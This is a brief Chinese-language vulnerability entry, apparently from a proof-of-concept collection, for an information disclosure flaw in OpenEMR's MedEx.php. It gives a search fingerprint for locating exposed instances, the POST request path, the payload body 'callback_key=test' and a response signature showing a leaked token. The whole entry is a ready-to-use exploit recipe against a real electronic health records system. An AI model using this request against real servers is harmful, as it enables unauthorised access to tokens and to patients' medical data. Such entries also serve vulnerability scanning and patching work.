# OpenEMR电子健康档案系统MedEx.php存在信息泄露漏洞

OpenEMR ｜ 信息泄露 ｜ —
- **指纹**：`title="OpenEMR"`
- **请求**：`POST /library/MedEx/MedEx.php HTTP/1.1`

**Payload**
```
like Gecko) Chrome/91.0.4472.77 Safari/537.36
callback_key=test
```
- **响应特征**：200 token